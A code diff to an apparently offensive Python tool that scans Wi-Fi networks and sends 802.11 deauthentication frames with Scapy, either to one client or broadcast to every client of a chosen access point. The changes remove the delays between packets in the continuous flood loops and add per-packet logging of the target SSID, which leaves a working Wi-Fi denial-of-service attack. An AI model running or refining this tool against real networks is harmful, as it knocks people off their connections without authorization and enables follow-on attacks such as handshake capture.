@@ -9,19 +9,17 @@
 ##########################################################################################
 
 import sys
-import time
 import os
 import subprocess
 import signal
 import platform
 import re
 
-try:
-    from scapy.all import sniff, sendp
-    from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
-    SCAPY_AVAILABLE = True
-except ImportError:
-    SCAPY_AVAILABLE = False
+# Import Scapy directly without checking
+from scapy.all import sniff, sendp
+from scapy.layers.dot11 import Dot11, Dot11Deauth, RadioTap, Dot11Beacon, Dot11Elt
+
+target_ssid = ""  # Global variable to store the target SSID
 
 def print_banner():
     """Display the program banner with usage warnings."""
@@ -62,15 +60,7 @@ def check_root_privileges():
         sys.exit(1)
 
 def check_requirements():
-    """Check if required dependencies (Scapy and airmon-ng) are installed."""
-    try:
-        if not SCAPY_AVAILABLE:
-            raise ImportError("Scapy module is not installed.")
-    except ImportError as e:
-        print(f"[-] Error: {e}")
-        print("[*] Install it by typing: 'pip install scapy'")
-        sys.exit(1)
-
+    """Check if required dependencies (airmon-ng and iwconfig) are installed."""
     try:
         result = subprocess.run(["airmon-ng"], capture_output=True, text=True)
         if result.returncode != 0 and "command not found" in result.stderr.lower():
@@ -81,6 +71,18 @@ def check_requirements():
         sys.exit(1)
     except Exception as e:
         print(f"[-] Unexpected error while checking airmon-ng: {e}")
+        sys.exit(1)
+
+    try:
+        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
+        if result.returncode != 0 and "command not found" in result.stderr.lower():
+            raise FileNotFoundError("iwconfig is not installed.")
+    except FileNotFoundError as e:
+        print(f"[-] Error: {e}")
+        print("[*] Install it by typing: 'sudo apt-get install wireless-tools'")
+        sys.exit(1)
+    except Exception as e:
+        print(f"[-] Unexpected error while checking iwconfig: {e}")
         sys.exit(1)
 
 def get_driver(interface):
@@ -250,7 +252,6 @@ def restore_managed_mode(interface):
         proc = subprocess.run(["sudo", "iwconfig", interface, "mode", "managed"], capture_output=True, text=True, timeout=10)
         if proc.returncode != 0:
             print(f"[-] Warning: Failed to set managed mode: {proc.stderr}")
-        time.sleep(1)
         
         print("[*] Restarting NetworkManager...")
         proc = subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, text=True, timeout=10)
@@ -280,7 +281,6 @@ def scan_networks(interface):
             if result.returncode != 0:
                 print(f"[-] Warning: Failed to set channel {channel}: {result.stderr}")
                 continue
-            time.sleep(1)
             try:
                 sniff(iface=interface, prn=lambda x: parse_packet(x, networks, channel), timeout=2)
             except Exception as e:
@@ -338,6 +338,7 @@ def deauth_single_client(interface, bssid, client_mac, channel, count):
         if result.returncode != 0:
             raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
         
+        global target_ssid
         packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth()
         
         if count == 0:
@@ -345,10 +346,11 @@ def deauth_single_client(interface, bssid, client_mac, channel, count):
             print("[*] Press 'Ctrl + C' to stop.")
             while True:
                 sendp(packet, iface=interface, verbose=False)
-                time.sleep(0.1)
         else:
             print(f"[*] Sending {count} deauth packets...")
-            sendp(packet, iface=interface, count=count, verbose=False)
+            for i in range(count):
+                sendp(packet, iface=interface, count=1, verbose=False)
+                print(f"[*] Sending deauth packet {i+1} to {target_ssid} ({bssid})")
         
         print("[+] Deauth attack completed")
     except ValueError as e:
@@ -385,6 +387,7 @@ def deauth_all_clients(interface, bssid, channel, count):
         if result.returncode != 0:
             raise RuntimeError(f"Failed to set channel {channel}: {result.stderr}")
         
+        global target_ssid
         packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=bssid, addr3=bssid) / Dot11Deauth()
         
         if count == 0:
@@ -392,10 +395,11 @@ def deauth_all_clients(interface, bssid, channel, count):
             print("[*] Press 'Ctrl + C' to stop.")
             while True:
                 sendp(packet, iface=interface, verbose=False)
-                time.sleep(0.1)
         else:
             print(f"[*] Sending {count} deauth packets...")
-            sendp(packet, iface=interface, count=count, verbose=False)
+            for i in range(count):
+                sendp(packet, iface=interface, count=1, verbose=False)
+                print(f"[*] Sending deauth packet {i+1} to {target_ssid} ({bssid})")
         
         print("[+] Deauth attack completed")
     except ValueError as e:
@@ -514,6 +518,7 @@ def get_attack_mode_choice():
 
 def main():
     """Main function to run the Wi-Fi deauthentication tool."""
+    global target_ssid
     try:
         signal.signal(signal.SIGINT, lambda sig, frame: sys.exit(1))
         
@@ -534,6 +539,7 @@ def main():
 
         networks = scan_networks(interface)
         target = get_valid_target(networks)
+        target_ssid = target['essid']
         
         mode = get_attack_mode_choice()
         
